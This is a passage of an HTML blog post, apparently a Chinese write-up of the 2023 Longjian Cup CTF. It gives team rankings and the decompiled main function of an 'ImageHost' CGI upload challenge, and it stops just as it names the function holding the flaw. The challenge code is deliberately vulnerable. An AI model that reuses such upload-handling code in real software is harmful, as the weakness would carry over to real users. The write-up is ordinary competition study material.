@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="bpww6NIyKNfozn7d3FvMSzrDS7_YpfeHmQhlR76xs0E">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Noto+Serif+SC:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=Roboto+Mono:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ex7l0it.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023年第二届陇剑杯线下半决赛部分题目 + 总决赛部分题目 Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023陇剑杯复盘">
+<meta property="og:url" content="https://ex7l0it.github.io/2023/09/16/ljb23/index.html">
+<meta property="og:site_name" content="Blog">
+<meta property="og:description" content="2023年第二届陇剑杯线下半决赛部分题目 + 总决赛部分题目 Writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/IMG_3208.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916102631498.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916101153357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916101857277.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916103735687.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916110113730.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916110946541.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230918204745722.png">
+<meta property="article:published_time" content="2023-09-16T01:36:09.000Z">
+<meta property="article:modified_time" content="2023-09-16T03:47:00.000Z">
+<meta property="article:author" content="Ex7l0it">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/IMG_3208.jpg">
+
+
+<link rel="canonical" href="https://ex7l0it.github.io/2023/09/16/ljb23/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ex7l0it.github.io/2023/09/16/ljb23/","path":"2023/09/16/ljb23/","title":"2023陇剑杯复盘"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023陇剑杯复盘 | Blog</title>
+  
+
+
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;796a8510575f44a696b7122ec8152063&quot;}'></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2023%E9%99%87%E5%89%91%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">2023陇剑杯半决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%88%98%E5%86%B5"><span class="nav-number">1.1.</span> <span class="nav-text">半决赛战况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8A%E5%86%B3%E8%B5%9B-Writeup"><span class="nav-number">1.2.</span> <span class="nav-text">半决赛 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1"><span class="nav-number">1.2.1.</span> <span class="nav-text">实景防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ImageHost"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">ImageHost</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#guide"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">guide</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.</span> <span class="nav-text">数据分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#soeasy"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">soeasy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session%E3%80%81easy-shiro"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">session、easy_shiro</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%BA%E5%B7%A5%E6%99%BA%E9%9A%9C"><span class="nav-number">1.2.3.</span> <span class="nav-text">人工智障</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fmt3-x64"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">fmt3_x64</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2023%E9%99%87%E5%89%91%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B"><span class="nav-number">2.</span> <span class="nav-text">2023陇剑杯总决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E6%9A%B4%E6%89%93%E7%9A%84%E6%88%98%E5%86%B5"><span class="nav-number">2.1.</span> <span class="nav-text">被暴打的战况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E5%86%B3%E8%B5%9B-Writeup"><span class="nav-number">2.2.</span> <span class="nav-text">总决赛 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">实景防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">数据分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%BA%E5%B7%A5%E6%99%BA%E9%9A%9C-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">人工智障</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ex7l0it"
+      src="https://avatars.githubusercontent.com/u/49543413">
+  <p class="site-author-name" itemprop="name">Ex7l0it</p>
+  <div class="site-description" itemprop="description">佛系更新</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ex7l0it" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ex7l0it" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ex7l0it.github.io/2023/09/16/ljb23/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/49543413">
+      <meta itemprop="name" content="Ex7l0it">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog">
+      <meta itemprop="description" content="佛系更新">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023陇剑杯复盘 | Blog">
+      <meta itemprop="description" content="2023年第二届陇剑杯线下半决赛部分题目 + 总决赛部分题目 Writeup">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023陇剑杯复盘<a href="https://github.com/ex7l0it/blog-source/tree/master/source/_posts/ljb23.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-09-16 09:36:09 / 修改时间：11:47:00" itemprop="dateCreated datePublished" datetime="2023-09-16T09:36:09+08:00">2023-09-16</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">2023年第二届陇剑杯线下半决赛部分题目 + 总决赛部分题目 Writeup</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/IMG_3208.jpg" alt="FishFarming"></p>
+<h1 id="2023陇剑杯半决赛"><a href="#2023陇剑杯半决赛" class="headerlink" title="2023陇剑杯半决赛"></a>2023陇剑杯半决赛</h1><h2 id="半决赛战况"><a href="#半决赛战况" class="headerlink" title="半决赛战况"></a>半决赛战况</h2><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916102631498.png" alt="半决赛得分"></p>
+<ul>
+<li>战况: 逐日组 10th. 总排名 24th.</li>
+<li>第一天体验海星，靠通防上大分😅</li>
+</ul>
+<h2 id="半决赛-Writeup"><a href="#半决赛-Writeup" class="headerlink" title="半决赛 Writeup"></a>半决赛 Writeup</h2><h3 id="实景防御"><a href="#实景防御" class="headerlink" title="实景防御"></a>实景防御</h3><ul>
+<li>MINIGAME、SafeNote、staticFix 直接 <a target="_blank" rel="noopener" href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a> 上通防就能 fix</li>
+<li><code>webpwn_</code> 队内的 web👴🏻 整的</li>
+</ul>
+<h4 id="ImageHost"><a href="#ImageHost" class="headerlink" title="ImageHost"></a>ImageHost</h4><ul>
+<li>这是一个 cgi 程序(<code>upload.cgi</code>)，所做工作是接收 POST 上来的文件数据，提取文件名，验证文件后缀是否合法，验证通过则随机生成文件名拼接后缀保存，并返回文件名</li>
+</ul>
+<details class="note info"><summary><p><code>main</code> 函数</p>
+</summary>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">FUN_001015ff</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  <span class="type">size_t</span> sVar4;</span><br><span class="line">  <span class="type">char</span> *pcVar5;</span><br><span class="line">  <span class="type">char</span> *pcVar6;</span><br><span class="line">  <span class="type">char</span> *pcVar7;</span><br><span class="line">  <span class="type">void</span> *__ptr;</span><br><span class="line">  <span class="type">ssize_t</span> sVar8;</span><br><span class="line">  </span><br><span class="line">  pcVar3 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((pcVar3 == <span class="literal">NULL</span>) || (iVar1 = strcasecmp(pcVar3,<span class="string">&quot;POST&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Invalid request method&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar3 = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar3 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;No data received&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = atoi(pcVar3);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 &lt; <span class="number">1</span>) || (<span class="number">0x500000</span> &lt; iVar1)) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Invalid content length&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar3 = <span class="built_in">malloc</span>(iVar1);</span><br><span class="line">  <span class="keyword">if</span> (pcVar3 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sVar4 = fread(pcVar3,<span class="number">1</span>,iVar1,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (sVar4 != iVar1) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to read content&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar5 = <span class="built_in">strstr</span>(pcVar3,<span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar5 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find file data&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = iVar1 - ((pcVar5 + <span class="number">4</span>) - pcVar3);</span><br><span class="line">  pcVar6 = <span class="built_in">strstr</span>(pcVar3,<span class="string">&quot;filename=\&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar6 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find filename&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar6 = pcVar6 + <span class="number">10</span>;</span><br><span class="line">  pcVar7 = <span class="built_in">strchr</span>(pcVar6,<span class="string">L&#x27;\&quot;&#x27;</span>); <span class="comment">// 提取文件名</span></span><br><span class="line">  <span class="keyword">if</span> (pcVar7 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find end of filename&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = pcVar7 - pcVar6;</span><br><span class="line">  pcVar7 = <span class="built_in">malloc</span>(iVar2 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar7 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(pcVar7,pcVar6,iVar2);</span><br><span class="line">  pcVar7[iVar2] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  iVar2 = FUN_001013c9(pcVar7); <span class="comment">// FUN_001013c9 这个函数进行后缀名合法检查</span></span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Invalid file type&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar6 = <span class="built_in">strrchr</span>(pcVar7,<span class="string">L&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar6 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to find file extension&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __ptr = FUN_00101506(pcVar6);</span><br><span class="line">  <span class="keyword">if</span> (__ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to generate filename&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar6 = FUN_00101473(__ptr);</span><br><span class="line">  <span class="keyword">if</span> (pcVar6 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to generate file path&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = open(pcVar6,<span class="number">0x241</span>,<span class="number">0x1ed</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to open file&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">    <span class="built_in">free</span>(pcVar6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sVar8 = write(iVar2,pcVar5 + <span class="number">4</span>,iVar1);</span><br><span class="line">  <span class="keyword">if</span> (sVar8 != iVar1) &#123;</span><br><span class="line">    FUN_001015c8(<span class="string">&quot;Failed to write file data&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(pcVar3);</span><br><span class="line">    <span class="built_in">free</span>(pcVar7);</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">    <span class="built_in">free</span>(pcVar6);</span><br><span class="line">    close(iVar2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  close(iVar2);</span><br><span class="line">  <span class="built_in">free</span>(pcVar3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content-Type: text/plain\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,__ptr);</span><br><span class="line">  <span class="built_in">free</span>(pcVar7);</span><br><span class="line">  <span class="built_in">free</span>(__ptr);</span><br><span class="line">  <span class="built_in">free</span>(pcVar6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</details>
+
+<p>漏洞在这 <code>FUN_001013c9</code> 函数里头:</p>
